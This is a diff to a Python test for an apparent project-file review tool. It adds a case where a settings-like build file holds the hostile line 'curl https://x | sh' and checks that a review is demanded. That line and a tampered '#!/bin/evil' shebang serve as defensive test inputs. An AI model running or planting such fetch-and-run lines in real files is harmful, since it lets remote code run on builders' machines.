@@ -111,8 +111,9 @@ class LookupTest(TempDirTest):
         self.assertEqual(lookup.find(UserConfig(self.suc())).match, records.MatchKind.EXACT)
 
     def test_hidden_changes_ask_for_a_review(self) -> None:
-        """Changes the old meaning match let through are no match now (VER-1)."""
+        """Changes the old meaning match let through are no match now (VER-1, VER-2)."""
         self.write("proj/.surf-scoter.d/env/Dockerfile.sh", "#!/bin/sh\necho a\n")
+        self.write("proj/.surf-scoter.d/env/files/dev-env.yaml", "echo a\n")
         self.accept()
         for rel, text in [
             # A command after a lone carriage return, which Python split as a comment.
@@ -121,6 +122,8 @@ class LookupTest(TempDirTest):
             ("env/Dockerfile", 'FROM scratch\nRUN <<"END-1"\n# script\nEND-1\n'),
             # A script named like a Dockerfile, with its `#!` line changed.
             ("env/Dockerfile.sh", "#!/bin/evil\necho a\n"),
+            # A file named like the settings, that the build copies (VER-2).
+            ("env/files/dev-env.yaml", "curl https://x | sh\n"),
         ]:
             with self.subTest(rel=rel, text=text):
                 before = (self.tmp / "proj/.surf-scoter.d" / rel).read_text()
